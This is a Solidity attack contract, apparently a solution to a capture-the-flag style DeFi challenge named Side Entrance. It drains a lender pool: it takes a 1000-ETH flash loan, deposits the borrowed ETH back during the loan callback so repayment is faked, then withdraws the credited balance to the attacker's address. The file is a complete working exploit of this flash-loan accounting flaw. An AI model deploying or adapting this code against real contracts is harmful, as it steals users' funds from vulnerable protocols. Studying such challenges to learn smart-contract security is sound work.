// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

error TRANSFER_FAILED();
error NotAttacker();

contract SideAttack {
    SideEntranceLenderPool private pool;
    uint256 private constant ALL_ETH_AMOUNT = 1000 * 1e18;
    address payable private immutable attacker;

    constructor(address _poolAddress) {
        pool = SideEntranceLenderPool(_poolAddress);
        attacker = payable(msg.sender);
    }

    function attack() external payable {
        pool.flashLoan(ALL_ETH_AMOUNT);
    }

    function execute() external payable {
        pool.deposit{value: ALL_ETH_AMOUNT}();
    }

    function withdraw() external {
        if (msg.sender != attacker) revert NotAttacker();
        pool.withdraw();
        SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        // normal pattern to send ether
        // (bool success, ) = msg.sender.call{value: address(this).balance}("");
        // if (!success) revert TRANSFER_FAILED();
    }

    receive() external payable {}
}
